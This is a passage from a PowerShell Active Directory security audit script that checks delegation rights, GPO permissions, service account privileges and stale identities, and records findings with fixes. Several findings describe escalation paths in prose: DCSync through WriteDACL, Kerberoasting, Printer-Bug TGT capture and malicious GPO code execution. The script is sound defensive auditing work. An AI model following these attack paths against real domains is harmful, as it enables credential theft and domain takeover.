    Add-Finding "PrivEscPaths" "WriteDACL / WriteOwner on Critical Objects" "Good" `
        "No non-admin principals have WriteDACL or WriteOwner on domain root, AdminSDHolder, or privileged groups" -Pts 6 -Max 6
} else {
    Add-Finding "PrivEscPaths" "WriteDACL/WriteOwner -- DACL Manipulation Escalation" "Critical" `
        "$($writeDACLRisks.Count) non-admin principal(s) have WriteDACL or WriteOwner on critical AD objects. One operation to grant self DCSync or full DA control." `
        -Resources $writeDACLRisks `
        -AttackPath "WriteDACL on domain root -> grant self 'Replicating Directory Changes All' -> DCSync -> all domain hashes. No group membership change, no Admin SDHolder propagation trigger." `
        -Fix "Remove WriteDACL/WriteOwner for non-admin principals from all critical objects. These rights should ONLY exist for Domain Admins, Enterprise Admins, and SYSTEM." `
        -MITRE "T1222.001" -CIS "9.7" -Pts 0 -Max 6
    Write-Host "  [!] WriteDACL/WriteOwner critical paths: $($writeDACLRisks.Count)" -ForegroundColor Red
}

# ===============================================================================
# DOMAIN 28 -- SEGREGATION OF DUTIES VIOLATIONS
# ===============================================================================
# Evaluates whether role boundaries are enforced -- i.e., whether accounts
# assigned to one role inappropriately also hold conflicting privileges.
# ===============================================================================
Write-Section "28. SEGREGATION OF DUTIES VIOLATIONS"

# -----------------------------------------------------------------------------
# 28.1 Service accounts that are also Domain Admins / high-privilege group members
# Service accounts have broad attack surface (Kerberoastable, used in many places).
# DA-equivalent service accounts are one cracked hash away from full compromise.
# -----------------------------------------------------------------------------
$svcInPrivGroups = [System.Collections.Generic.List[string]]::new()

foreach ($svcAcct in $script:ServiceAccounts) {
    $memberOfDNs = @($svcAcct.MemberOf)
    foreach ($privGrpName in @('Domain Admins','Enterprise Admins','Schema Admins','Administrators')) {
        $pdn = $privGroupDNs[$privGrpName]
        if ($pdn -and $memberOfDNs -contains $pdn) {
            $svcInPrivGroups.Add("Account:$($svcAcct.SamAccountName) | Group:$privGrpName | SPN:$($svcAcct.ServicePrincipalName -join ',')")
        }
    }
}

if ($svcInPrivGroups.Count -eq 0) {
    Add-Finding "SoDViolations" "Service Accounts in Privileged Groups" "Good" `
        "No service accounts (by naming or SPN) are members of DA/EA/Schema/Administrators" -Pts 6 -Max 6
} else {
    Add-Finding "SoDViolations" "SoD Violation -- Service Accounts with Admin Membership" "Critical" `
        "$($svcInPrivGroups.Count) service account(s) hold privileged group membership. Kerberoasting these accounts yields DA credentials in one offline crack." `
        -Resources $svcInPrivGroups `
        -AttackPath "Kerberoast SPN account -> offline crack (if weak password) -> DA credentials -> immediate domain compromise. No interactive logon required." `
        -Fix "Remove service accounts from all privileged groups. Apply least privilege: grant ONLY the specific object rights required (e.g., logon as service). Use gMSA to eliminate password exposure entirely." `
        -MITRE "T1558.003" -CIS "16.2" -Pts 0 -Max 6
    Write-Host "  [!] Service accounts in privileged groups: $($svcInPrivGroups.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 28.2 Admin accounts with interactive mailbox or regular-user group memberships
# Tier model: DA accounts must not also be standard user accounts.
# Mixing admin and user roles in one account defeats tiered access entirely.
# -----------------------------------------------------------------------------
try {
    $adminWithUserRoles = @($script:AdminAccounts | Where-Object {
        $_.Enabled -and
        $_.MemberOf -and
        # Admin account that ALSO has membership in standard user groups
        # (not just privileged groups or standard Domain Users/Protected Users)
        (@($_.MemberOf) | Where-Object {
            $grpDN = $_
            $grpDN -notmatch 'Domain Admins|Enterprise Admins|Schema Admins|Protected Users|' +
                              'Group Policy Creator|Account Operators|Backup Operators|' +
                              'Remote Management|Remote Desktop|CN=Domain Users' -and
            # Standard business-function groups (not a hardened admin OU)
            $grpDN -match 'OU=Users|CN=Users|OU=Staff|OU=Employees|OU=Finance|OU=HR|OU=Sales'
        }).Count -gt 0
    })
    if ($adminWithUserRoles.Count -gt 0) {
        Add-Finding "SoDViolations" "Admin Accounts with User-Role Group Memberships" "High" `
            "$($adminWithUserRoles.Count) AdminCount=1 account(s) also have standard business-function group memberships. Admin accounts must be dedicated -- mixing roles breaks tiered access model." `
            -Resources ($adminWithUserRoles.SamAccountName) `
            -Fix "Create separate admin accounts (e.g., adm_jsmith) distinct from daily-use accounts. Admin accounts: no email, no internet, no standard apps, no business-function group memberships." `
            -MITRE "T1078.002" -CIS "4.1" -Pts 0 -Max 4
    } else {
        Add-Finding "SoDViolations" "Admin Account Isolation" "Good" `
            "No AdminCount=1 accounts detected with standard user-tier group memberships" -Pts 4 -Max 4
    }
}
catch { Write-AuditWarning "28.2 Admin role isolation" $_.Exception.Message "SoDViolations" }

# -----------------------------------------------------------------------------
# 28.3 Conflicting privileged group memberships (compound over-privilege)
# Being in BOTH Backup Operators AND Domain Admins = highest risk.
# Being in BOTH Account Operators AND Server Operators = escalation via RBCD.
# -----------------------------------------------------------------------------
$conflictPairs = @(
    @('Backup Operators',     'Domain Admins';    Note = 'SeBackupPrivilege + DA = NTDS.dit dump without any AD rights')
    @('Account Operators',    'Server Operators'; Note = 'Can modify accounts AND services on member servers')
    @('Print Operators',      'Domain Admins';    Note = 'SeLoadDriverPrivilege + DA = BYOVD + full domain control')
    @('DnsAdmins',            'Domain Admins';    Note = 'DNS DLL injection + DA = redundant, highest compound risk')
    @('Group Policy Creator Owners', 'Domain Admins'; Note = 'GPO creation + DA = unnecessary; DA already controls GPO')
)

$compoundPrivRisks = [System.Collections.Generic.List[string]]::new()
foreach ($pair in $conflictPairs) {
    $g1members = @($allPrivMembers[$pair[0]])
    $g2members = @($allPrivMembers[$pair[1]])
    if (-not $g1members -or -not $g2members) { continue }
    $overlap =@( @($g1members | Where-Object { $_.SamAccountName -in $g2members.SamAccountName }))
    foreach ($acct in $overlap) {
        $compoundPrivRisks.Add("Account:$($acct.SamAccountName) | Groups:[$($pair[0])] AND [$($pair[1])] | Note:$($pair.Note)")
    }
}

if ($compoundPrivRisks.Count -eq 0) {
    Add-Finding "SoDViolations" "Compound Privileged Group Overlap" "Good" `
        "No accounts detected in conflicting compound-privilege group combinations" -Pts 4 -Max 4
} else {
    Add-Finding "SoDViolations" "SoD -- Conflicting Compound Privilege" "High" `
        "$($compoundPrivRisks.Count) account(s) hold memberships in conflicting privileged groups. Compound privilege amplifies blast radius: a single compromised account yields multiple escalation vectors." `
        -Resources $compoundPrivRisks `
        -Fix "Review each account. Remove from the lower-tier group (e.g., Backup Operators) if DA membership already covers the need. Separate duties across different accounts." `
        -MITRE "T1078.002" -CIS "16.3" -Pts 0 -Max 4
}

# -----------------------------------------------------------------------------
# 28.4 Interactive logon rights for service accounts (GPO User Rights Assignment)
# Service accounts should NEVER have interactive logon. Interactive logon =
# credentials cached on endpoint = harvestable by anyone with local admin.
# -----------------------------------------------------------------------------
$svcWithInteractive = @($script:ServiceAccounts | Where-Object {
    $_.Enabled -and
    # UAC flag: NORMAL_ACCOUNT without WORKSTATION_TRUST_ACCOUNT
    -not ($_.UserAccountControl -band 0x1000) -and
    # Has never-expires password -- typical for non-gMSA service accounts
    $_.PasswordNeverExpires -eq $true
})

if ($svcWithInteractive.Count -gt 0) {
    Add-Finding "SoDViolations" "Service Accounts with Interactive Logon Potential" "Medium" `
        "$($svcWithInteractive.Count) service account(s) have PasswordNeverExpires and no gMSA -- likely used for interactive or scheduled tasks. Verify GPO denies interactive/RDP logon for these accounts." `
        -Resources ($svcWithInteractive.SamAccountName) `
        -Fix "GPO: Computer Config -> Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment -> Deny log on locally / Deny log on through Remote Desktop = add all service accounts. Use 'Deny logon as batch job' unless required." `
        -MITRE "T1078.003" -CIS "2.2.26" -Pts 0 -Max 3
}

# -----------------------------------------------------------------------------
# 28.5 Kerberos-constrained delegation on non-service principals
# Delegation rights on user accounts (not computers) are unusual.
# Protocol transition (TrustedToAuthForDelegation) on any account = impersonate any user.
# -----------------------------------------------------------------------------
$trustedForDelegation = @($script:AllUsers | Where-Object {
    $_.Enabled -and $_.TrustedForDelegation -and
    $_.SamAccountName -notmatch 'krbtgt'
})
$protocolTransitionUsers = @($script:AllUsers | Where-Object {
    $_.Enabled -and $_.TrustedToAuthForDelegation
})

if ($trustedForDelegation.Count -gt 0) {
    Add-Finding "SoDViolations" "User Accounts with Unconstrained Delegation" "Critical" `
        "$($trustedForDelegation.Count) user account(s) have TrustedForDelegation (unconstrained). Any TGT presented to these accounts is saved in memory -- extractable with $($script:T.RB)/$($script:T.MK)." `
        -Resources ($trustedForDelegation.SamAccountName) `
        -AttackPath "Printer-Bug coerce DC auth to delegating account -> extract DC TGT from memory -> DCSync using DC's identity -> all domain hashes" `
        -Fix "Remove unconstrained delegation from all user accounts. For legitimate delegation, use RBCD (resource-based constrained delegation) instead: Set-ADUser -TrustedForDelegation `$false" `
        -MITRE "T1558.001" -CIS "2.3.9" -Pts 0 -Max 5
}
if ($protocolTransitionUsers.Count -gt 0) {
    Add-Finding "SoDViolations" "User Accounts with Protocol Transition Delegation" "High" `
        "$($protocolTransitionUsers.Count) user account(s) have TrustedToAuthForDelegation (Kerberos protocol transition). Can impersonate ANY domain user to ANY service." `
        -Resources ($protocolTransitionUsers.SamAccountName) `
        -Fix "Replace with constrained delegation without protocol transition: use msDS-AllowedToDelegateTo with specific SPNs and remove TrustedToAuthForDelegation flag." `
        -MITRE "T1558.001" -Pts 0 -Max 5
}
if ($trustedForDelegation.Count -eq 0 -and $protocolTransitionUsers.Count -eq 0) {
    Add-Finding "SoDViolations" "User Account Delegation Hygiene" "Good" `
        "No user accounts have unconstrained or protocol-transition delegation" -Pts 5 -Max 5
}

# ===============================================================================
# DOMAIN 29 -- GPO & OU DELEGATION DEEP AUDIT
# ===============================================================================
# Evaluates who can create, link, or modify Group Policy -- the highest-impact
# configuration path in AD. Also audits OU-level delegations to identify
# over-privileged help desk / tier 1 roles.
# ===============================================================================
Write-Section "29. GPO & OU DELEGATION DEEP AUDIT"

# -----------------------------------------------------------------------------
# 29.1 Who can create new GPOs (CreateGPO right on CN=Policies container)
# -----------------------------------------------------------------------------
$gpoPoliciesContainer = "CN=Policies,CN=System,$domainDN"
$gpoCreateRisks       = [System.Collections.Generic.List[string]]::new()

try {
    $gpoCnACL = Get-Acl "AD:\$gpoPoliciesContainer" -ErrorAction Stop
    $createGPOAces =@( @($gpoCnACL.Access) | Where-Object {
        $_.AccessControlType -eq 'Allow' -and
        ($_.ActiveDirectoryRights -band 'CreateChild' -or
         $_.ActiveDirectoryRights -band 'GenericAll'  -or
         $_.ActiveDirectoryRights -band 'GenericWrite') -and
        $_.IdentityReference.Value -notmatch
            'Domain Admins|Group Policy Creator Owners|Enterprise Admins|SYSTEM|Administrators'
    })
    foreach ($ace in $createGPOAces) {
        $gpoCreateRisks.Add("Principal:$($ace.IdentityReference.Value) | Right:$($ace.ActiveDirectoryRights) | Container:CN=Policies")
    }
}
catch { Write-AuditWarning "29.1 GPO create rights" $_.Exception.Message "GPODelegation" }

if ($gpoCreateRisks.Count -eq 0) {
    Add-Finding "GPODelegation" "GPO Creation Rights" "Good" `
        "Only Group Policy Creator Owners and admins can create new GPOs" -Pts 5 -Max 5
} else {
    Add-Finding "GPODelegation" "Unauthorised GPO Creation Rights" "Critical" `
        "$($gpoCreateRisks.Count) non-admin principal(s) can create Group Policy Objects. A new GPO linked at domain/OU level can execute arbitrary code on all affected machines at next Group Policy refresh." `
        -Resources $gpoCreateRisks `
        -AttackPath "Create malicious GPO (startup script / scheduled task / MSI) -> link to domain root or DC OU (if link rights also held) -> code executes as SYSTEM on all DCs/workstations at next GP refresh (90min default)" `
        -Fix "Remove CreateChild rights from CN=Policies container for non-admin groups. Manage 'Group Policy Creator Owners' membership: should contain only named admin accounts." `
        -MITRE "T1484.001" -CIS "18.1" -Pts 0 -Max 5
    Write-Host "  [!] Unauthorised GPO create principals: $($gpoCreateRisks.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 29.2 GPO edit / modify permissions on existing GPOs
# Who can edit GPOs that are linked to high-value OUs (DCs, servers, etc.)
# -----------------------------------------------------------------------------
$gpoEditRisks = [System.Collections.Generic.List[string]]::new()

try {
    $allGPOs = @(Get-GPO -All @dcParam -ErrorAction Stop)
    foreach ($gpo in ($allGPOs | Select-Object -First 50)) {   # cap to first 50 for performance
        try {
            $gpoPerms = Get-GPPermission -Guid $gpo.Id -All @dcParam -ErrorAction Stop
            $gpoEditAces = @($gpoPerms) | Where-Object {
                $_.Permission -in @('GpoEdit','GpoEditDeleteModifySecurity') -and
                $_.Trustee.Name -notmatch 'Domain Admins|Enterprise Admins|SYSTEM|Administrators'
            }

            foreach ($ace in $gpoEditAces) {
                $gpoEditRisks.Add("GPO:'$($gpo.DisplayName)' | Trustee:$($ace.Trustee.Name) | Perm:$($ace.Permission)")
            }
        } catch {}
    }
}
catch { Write-AuditWarning "29.2 GPO edit permissions" $_.Exception.Message "GPODelegation" }

if ($gpoEditRisks.Count -eq 0) {
    Add-Finding "GPODelegation" "GPO Edit Permissions" "Good" "Only admins have GpoEdit / GpoEditDeleteModifySecurity on existing GPOs" -Pts 4 -Max 4
} else {
    Add-Finding "GPODelegation" "Non-Admin GPO Edit Access" "High" `
        "$($gpoEditRisks.Count) instance(s) of non-admin edit access on GPOs. Editing an existing linked GPO is equivalent to code execution on all in-scope systems." `
        -Resources ($gpoEditRisks | Select-Object -First 40) `
        -Fix "Review GPO permissions: Get-GPPermission -Name 'GPO_NAME' -All. Remove GpoEdit rights for non-admin accounts. Establish change management process for all GPO edits." `
        -MITRE "T1484.001" -CIS "18.2" -Pts 0 -Max 4
    Write-Host "  [!] Non-admin GPO edit rights: $($gpoEditRisks.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 29.3 GPO link permissions on critical OUs
# Who can link a GPO to the Domain Controllers OU or the domain root?
# A linked malicious GPO executes on DCs = SYSTEM on all domain controllers.
# -----------------------------------------------------------------------------
$gpoLinkRisks = [System.Collections.Generic.List[string]]::new()

$linkTargets = @(
    @{ Path = $domainDN;                            Label = 'Domain Root' }
    @{ Path = "OU=Domain Controllers,$domainDN";    Label = 'DC OU' }
)

foreach ($target in $linkTargets) {
    try {
        $tACL = Get-Acl "AD:\$($target.Path)" -ErrorAction Stop
        $linkAces =@( @($tACL.Access) | Where-Object {
            $_.AccessControlType -eq 'Allow' -and
            # GpLink attribute: GUID f30e3bc1-9ff0-11d1-b603-0000f80367c1
            (($_.ActiveDirectoryRights -band 'WriteProperty') -and
             ($_.ObjectType -eq [guid]'f30e3bc1-9ff0-11d1-b603-0000f80367c1' -or
              $_.ObjectType -eq [guid]::Empty)) -and
            $_.IdentityReference.Value -notmatch $escalationAuthorisedPattern
        })
        foreach ($ace in $linkAces) {
            $gpoLinkRisks.Add("Target:$($target.Label) | Principal:$($ace.IdentityReference.Value) | Right:WriteProperty[gpLink]")
        }
    } catch {}
}

if ($gpoLinkRisks.Count -eq 0) {
    Add-Finding "GPODelegation" "GPO Link Rights on Domain Root / DC OU" "Good" `
        "Only admins can link GPOs to the domain root or Domain Controllers OU" -Pts 5 -Max 5
} else {
    Add-Finding "GPODelegation" "Unauthorised GPO Link Rights on Critical OUs" "Critical" `
        "$($gpoLinkRisks.Count) non-admin principal(s) can link GPOs to Domain Root or DC OU. Linking any GPO (including newly created) = code execution on DCs at next refresh." `
        -Resources $gpoLinkRisks `
        -Fix "Remove WriteProperty[gpLink] from non-admin principals on domain root and DC OU. Only DA/EA/Group Policy Creator Owners should have this right." `
        -MITRE "T1484.001" -CIS "18.3" -Pts 0 -Max 5
    Write-Host "  [!] GPO link rights on critical OUs: $($gpoLinkRisks.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 29.4 Broad OU delegation scope -- over-privileged help desk / tier 1
# Detects OUs where delegated controllers have GenericAll or WriteDacl
# (full OU control rather than scoped delegation for specific attributes).
# -----------------------------------------------------------------------------
$ouOverDelegRisks = [System.Collections.Generic.List[string]]::new()

try {
    $allOUs = @(Get-ADOrganizationalUnit -Filter * @dcParam -ErrorAction Stop |
                Select-Object -First 60)   # cap for performance

    foreach ($ou in $allOUs) {
        try {
            $ouACL = Get-Acl "AD:\$($ou.DistinguishedName)" -ErrorAction Stop
            $broadDelegAces =@( @($ouACL.Access) | Where-Object {
                $ace = $_
                $ace.AccessControlType -eq 'Allow' -and
                $ace.IsInherited       -eq $false -and
                ($ace.ActiveDirectoryRights -band 'GenericAll' -or
                 $ace.ActiveDirectoryRights -band 'WriteDacl'  -or
                 $ace.ActiveDirectoryRights -band 'WriteOwner') -and
                $ace.IdentityReference.Value -notmatch $escalationAuthorisedPattern
            })
            foreach ($ace in $broadDelegAces) {
                $ouShort = $ou.DistinguishedName -replace ',DC=.*',''
                $ouOverDelegRisks.Add("OU:$ouShort | Principal:$($ace.IdentityReference.Value) | Right:$($ace.ActiveDirectoryRights)")
            }
        } catch {}
    }
}
catch { Write-AuditWarning "29.4 OU over-delegation" $_.Exception.Message "GPODelegation" }

if ($ouOverDelegRisks.Count -eq 0) {
    Add-Finding "GPODelegation" "OU Delegation Scope" "Good" "No OUs have GenericAll / WriteDACL delegated to non-admin principals" -Pts 4 -Max 4
} else {
    Add-Finding "GPODelegation" "Over-Privileged OU Delegation" "High" `
        "$($ouOverDelegRisks.Count) OU(s) have GenericAll or WriteDACL delegated to non-admins. GenericAll on an OU = full control of all objects it contains." `
        -Resources ($ouOverDelegRisks | Select-Object -First 40) `
        -Fix "Re-delegate using the AD Delegation Wizard with attribute-scoped rights (e.g., 'Reset passwords on User objects only'). Never delegate GenericAll to help desk or tier 1." `
        -MITRE "T1222.001" -CIS "9.8" -Pts 0 -Max 4
    Write-Host "  [!] Over-privileged OU delegation: $($ouOverDelegRisks.Count)" -ForegroundColor DarkYellow
}

# ===============================================================================
# DOMAIN 30 -- DORMANT, ORPHANED & SHARED IDENTITY AUDIT
# ===============================================================================
# Identifies unused, unmanaged, or inadequately lifecycle-managed identities
# that represent persistent backdoors, persistence mechanisms, or compliance
# violations under the principle of least privilege.
# ===============================================================================
Write-Section "30. DORMANT, ORPHANED & SHARED IDENTITY AUDIT"

$cutoff90  = (Get-Date).AddDays(-90)
$cutoff180 = (Get-Date).AddDays(-180)

# -----------------------------------------------------------------------------
# 30.1 Stale enabled user accounts (no logon in 90+ days)
# Dormant accounts are prime targets: no owner monitors them, password may be
# unchanged for years, MFA may not be enrolled.
# -----------------------------------------------------------------------------
$staleUsers = @($script:AllUsers | Where-Object {
    $_.Enabled -eq $true -and
    $_.LastLogonDate -and
    $_.LastLogonDate -lt $cutoff90 -and
    $_.SamAccountName -notmatch $defaultPattern
})
$stalePrivUsers =@( @($staleUsers | Where-Object { $_.AdminCount -eq 1 }))

if ($stalePrivUsers.Count -gt 0) {
    Add-Finding "DormantIdentity" "Stale Privileged Accounts (90+ days no logon)" "Critical" `
        "$($stalePrivUsers.Count) AdminCount=1 account(s) enabled but not used in 90+ days. Stale admin accounts are primary targets for attacker persistence -- no owner will notice suspicious logons." `
        -Resources ($stalePrivUsers | ForEach-Object { "$($_.SamAccountName) [Last:$($_.LastLogonDate)]" }) `
        -Fix "Disable immediately: Disable-ADAccount -Identity ACCT. After 30 days of no business objection, delete. Automate with AD Lifecycle Management policy." `
        -MITRE "T1078.002" -CIS "16.6" -Pts 0 -Max 6
    Write-Host "  [!] Stale privileged accounts: $($stalePrivUsers.Count)" -ForegroundColor Red
}
if ($staleUsers.Count -gt 0) {
    Add-Finding "DormantIdentity" "Stale User Accounts (90+ days no logon)" "High" `
        "$($staleUsers.Count) enabled user account(s) not used in 90+ days ($($stalePrivUsers.Count) privileged). Dormant accounts bypass MFA push fatigue and are unmonitored." `
        -Resources ($staleUsers | Select-Object -First 30 | ForEach-Object { "$($_.SamAccountName) [Last:$($_.LastLogonDate)]" }) `
        -Fix "Automate: Search-ADAccount -AccountInactive -TimeSpan (New-TimeSpan -Days 90) -UsersOnly | Disable-ADAccount. Implement 90-day inactivity policy in HR/IT workflow." `
        -MITRE "T1078" -CIS "16.7" -Pts 0 -Max 5
} else {
    Add-Finding "DormantIdentity" "User Account Activity" "Good" "No enabled user accounts inactive for 90+ days detected" -Pts 5 -Max 5
}

# -----------------------------------------------------------------------------
# 30.2 Stale computer accounts (no authentication in 90 days)
# Stale computers indicate decommissioned hosts that still hold domain membership.
# Their machine account passwords can be replayed, and they can appear in LAPS
# but their local admin password is unknown.
# -----------------------------------------------------------------------------
$staleComputers = @($script:AllComputers | Where-Object {
    $_.Enabled -eq $true -and
    $_.LastLogonDate -and
    $_.LastLogonDate -lt $cutoff90 -and
    # Exclude DCs -- they may have variable logon patterns
    $_.DistinguishedName -notmatch 'OU=Domain Controllers'
})

if ($staleComputers.Count -gt 0) {
    Add-Finding "DormantIdentity" "Stale Computer Accounts" "Medium" `
        "$($staleComputers.Count) enabled computer account(s) not authenticated in 90+ days. Phantom computer accounts pollute the domain, inflate license counts, and may allow Silver Ticket attacks using old password hashes." `
        -Resources ($staleComputers | Select-Object -First 30 | ForEach-Object { "$($_.Name) [OS:$($_.OperatingSystem)] [Last:$($_.LastLogonDate)]" }) `
        -Fix "Search-ADAccount -AccountInactive -TimeSpan (New-TimeSpan -Days 90) -ComputersOnly | Disable-ADAccount. After 30 days, remove. Automate via MECM/Intune device retirement workflow." `
        -MITRE "T1550.003" -CIS "16.8" -Pts 0 -Max 3
} else {
    Add-Finding "DormantIdentity" "Computer Account Activity" "Good" "No enabled computer accounts inactive for 90+ days" -Pts 3 -Max 3
}

# -----------------------------------------------------------------------------
# 30.3 Disabled accounts still holding privileged group memberships
# A disabled account that retains DA membership is a time-bomb: if re-enabled
# (by accident, compromise of account-operators, or legacy tool), it provides
# instant DA access with no further actions needed.
# -----------------------------------------------------------------------------
$disabledWithPriv = [System.Collections.Generic.List[string]]::new()

try {
    $disabledUsers =@( @($script:AllUsers | Where-Object { $_.Enabled -eq $false -and $_.AdminCount -eq 1 }))
    foreach ($user in $disabledUsers) {
        foreach ($grpName in @('Domain Admins','Enterprise Admins','Schema Admins','Administrators','Backup Operators')) {
            $pdn = $privGroupDNs[$grpName]
            if ($pdn -and @($user.MemberOf) -contains $pdn) {
                $disabledWithPriv.Add("Account:$($user.SamAccountName) [DISABLED] | Group:$grpName | Created:$($user.Created)")
            }
        }
    }
}
catch { Write-AuditWarning "30.3 Disabled privileged accounts" $_.Exception.Message "DormantIdentity" }

if ($disabledWithPriv.Count -eq 0) {
    Add-Finding "DormantIdentity" "Disabled Accounts with Privileged Membership" "Good" `
        "No disabled accounts retain privileged group memberships" -Pts 5 -Max 5
} else {
    Add-Finding "DormantIdentity" "Disabled Accounts Retain Privileged Group Membership" "High" `
        "$($disabledWithPriv.Count) disabled account(s) retain privileged group membership. Re-enabling the account (or an attacker using legacy re-enable techniques) grants instant DA access." `
        -Resources $disabledWithPriv `
        -Fix "Remove disabled accounts from all privileged groups before or at time of disabling: Get-ADUser -Filter {Enabled -eq \$false -and AdminCount -eq 1} | ForEach-Object { Remove-ADGroupMember 'Domain Admins' -Members `$_ -Confirm:`$false }" `
        -MITRE "T1078.002" -CIS "16.9" -Pts 0 -Max 5
    Write-Host "  [!] Disabled accounts retaining DA/EA membership: $($disabledWithPriv.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 30.4 Orphaned groups -- empty or members-all-disabled
# Empty privileged groups are harmless but indicate lifecycle failures.
# A group with only disabled members that has GenericAll on a sensitive object
# could be re-populated by an attacker with Account Operator access.
# -----------------------------------------------------------------------------
$emptyPrivGroups    = [System.Collections.Generic.List[string]]::new()
$allDisabledPrivGrp = [System.Collections.Generic.List[string]]::new()

try {
    foreach ($grp in ($script:AllGroups | Where-Object { $_.adminCount -eq 1 -or $_.Name -match $adminPattern })) {
        $members = @(Get-ADGroupMember -Identity $grp.DistinguishedName @dcParam -ErrorAction SilentlyContinue)
        if ($members.Count -eq 0) {
            $emptyPrivGroups.Add("$($grp.Name) [Scope:$($grp.GroupScope)]")
        } else {
            $enabledMembers = @($members | Where-Object { $_.objectClass -eq 'user' } | ForEach-Object {
                Get-ADUser -Identity $_.DistinguishedName -Properties Enabled @dcParam -ErrorAction SilentlyContinue
            } | Where-Object { $_.Enabled -eq $true })
            if ($enabledMembers.Count -eq 0 -and $members.Count -gt 0) {
                $allDisabledPrivGrp.Add("$($grp.Name) [$($members.Count) member(s), all disabled]")
            }
        }
    }
}
catch { Write-AuditWarning "30.4 Orphaned groups" $_.Exception.Message "DormantIdentity" }

if ($emptyPrivGroups.Count -gt 0) {
    Add-Finding "DormantIdentity" "Empty Privileged-Pattern Groups" "Low" `
        "$($emptyPrivGroups.Count) empty group(s) with privileged naming or AdminCount. Clean up to prevent re-population attacks." `
        -Resources $emptyPrivGroups `
        -Fix "Delete empty groups that serve no current purpose. Audit their ACL memberships first." -Pts 0 -Max 1
}
if ($allDisabledPrivGrp.Count -gt 0) {
    Add-Finding "DormantIdentity" "Privileged Groups with All-Disabled Members" "Medium" `
        "$($allDisabledPrivGrp.Count) privileged-pattern group(s) have no enabled members. If these groups hold ACL rights, re-adding a compromised account grants those rights instantly." `
        -Resources $allDisabledPrivGrp `
        -Fix "Audit rights held by each group. If no operational purpose, remove from all ACLs and delete." `
        -MITRE "T1078.002" -Pts 0 -Max 2
}

# -----------------------------------------------------------------------------
# 30.5 Service accounts with password age > 365 days (not gMSA)
# Stale service account passwords indicate no rotation policy.
# Long-lived passwords = higher probability of credential theft going undetected.
# -----------------------------------------------------------------------------
$staleServicePasswords = @($script:ServiceAccounts | Where-Object {
    $_.Enabled -and
    $_.PasswordLastSet -and
    $_.PasswordLastSet -lt (Get-Date).AddDays(-365) -and
    $_.SamAccountName -notmatch '\$$'    # exclude gMSA (auto-rotated)
})

if ($staleServicePasswords.Count -gt 0) {
    Add-Finding "DormantIdentity" "Service Account Stale Passwords (365+ days)" "High" `
        "$($staleServicePasswords.Count) service account(s) with passwords unchanged for 365+ days. Stale service account passwords are primary Kerberoasting targets and may already be compromised undetected." `
        -Resources ($staleServicePasswords | ForEach-Object { "$($_.SamAccountName) [PwdAge:$([int]((Get-Date) - $_.PasswordLastSet).TotalDays)d] [SPN:$(($_.ServicePrincipalName -join ',') -replace '^$','none')]" }) `
        -Fix "Migrate to gMSA for auto-rotation. For manual accounts: Reset-ADAccountPassword -Identity ACCT -NewPassword (ConvertTo-SecureString -AsPlainText '...' -Force). Enforce 90-day max password age via FGPP for all service accounts." `
        -MITRE "T1558.003" -CIS "16.10" -Pts 0 -Max 5
} else {
    Add-Finding "DormantIdentity" "Service Account Password Age" "Good" "All enabled service accounts have passwords changed within 365 days" -Pts 5 -Max 5
}

# -----------------------------------------------------------------------------
# 30.6 Accounts with Password Never Expires AND no SPN AND no gMSA
# These are regular user accounts treated like service accounts -- the worst
# of both worlds: enumerable like users, permanent password like services.
# -----------------------------------------------------------------------------
$neverExpiresNoSPN = @($script:AllUsers | Where-Object {
    $_.Enabled -and
    $_.PasswordNeverExpires -and
    -not $_.ServicePrincipalName -and
    $_.SamAccountName -notmatch $defaultPattern -and
    $_.SamAccountName -notmatch '\$$'
})
$neverExpiresWithPriv =@( @($neverExpiresNoSPN | Where-Object { $_.AdminCount -eq 1 }))

if ($neverExpiresWithPriv.Count -gt 0) {
    Add-Finding "DormantIdentity" "Privileged Accounts with PasswordNeverExpires" "Critical" `
        "$($neverExpiresWithPriv.Count) AdminCount=1 account(s) have PasswordNeverExpires=True. Compromised credential is valid indefinitely -- no forced rotation, no expiry-triggered detection." `
        -Resources ($neverExpiresWithPriv.SamAccountName) `
        -Fix "Set-ADUser -PasswordNeverExpires `$false for all admin accounts. Apply FGPP with MaxPasswordAge=90 to all AdminCount=1 accounts." `
        -MITRE "T1078.002" -CIS "1.1.2" -Pts 0 -Max 5
}
if ($neverExpiresNoSPN.Count -gt 0) {
    Add-Finding "DormantIdentity" "User Accounts with Password Never Expires" "Medium" `
        "$($neverExpiresNoSPN.Count) user account(s) ($($neverExpiresWithPriv.Count) privileged) have PasswordNeverExpires. Violates least-privilege password lifecycle policy." `
        -Resources ($neverExpiresNoSPN | Select-Object -First 30 | ForEach-Object { $_.SamAccountName }) `
        -Fix "Set-ADUser -PasswordNeverExpires `$false. Enforce via Default Domain Password Policy or FGPP." `
        -MITRE "T1078" -CIS "1.1.2" -Pts 0 -Max 3
} else {
    Add-Finding "DormantIdentity" "Password Expiry Policy" "Good" `
        "No enabled user accounts (non-SPN) have PasswordNeverExpires set" -Pts 3 -Max 3
}

# -----------------------------------------------------------------------------
# 30.7 Privileged access audit trail -- accounts with AdminCount=1
#      that have not logged in since account creation (never used admin accounts)
# -----------------------------------------------------------------------------
try {
    $neverLoggedInAdmin = @($script:AllUsers | Where-Object {
        $_.AdminCount -eq 1 -and
        $_.Enabled    -eq $true -and
        (-not $_.LastLogonDate -or $_.LastLogonDate -lt $_.Created.AddDays(1))
    })
    if ($neverLoggedInAdmin.Count -gt 0) {
        Add-Finding "DormantIdentity" "Privileged Accounts Never Used" "High" `
            "$($neverLoggedInAdmin.Count) AdminCount=1 account(s) are enabled but have never been used (no logon recorded). Unknown-owner admin accounts are unmonitored backdoors." `
            -Resources ($neverLoggedInAdmin.SamAccountName) `
            -Fix "Disable and investigate: Disable-ADAccount -Identity ACCT. Confirm owner with HR/access management system. If no owner, delete." `
            -MITRE "T1078.002" -Pts 0 -Max 4
    }
}
catch { Write-AuditWarning "30.7 Never-used admin accounts" $_.Exception.Message "DormantIdentity" }

# -----------------------------------------------------------------------------
# 30.8 Audit warning summary -- incomplete checks report
# -----------------------------------------------------------------------------
if ($script:AuditWarnings.Count -gt 0) {
    Add-Finding "DormantIdentity" "Audit Coverage Gaps -- Permission Warnings" "Info" `
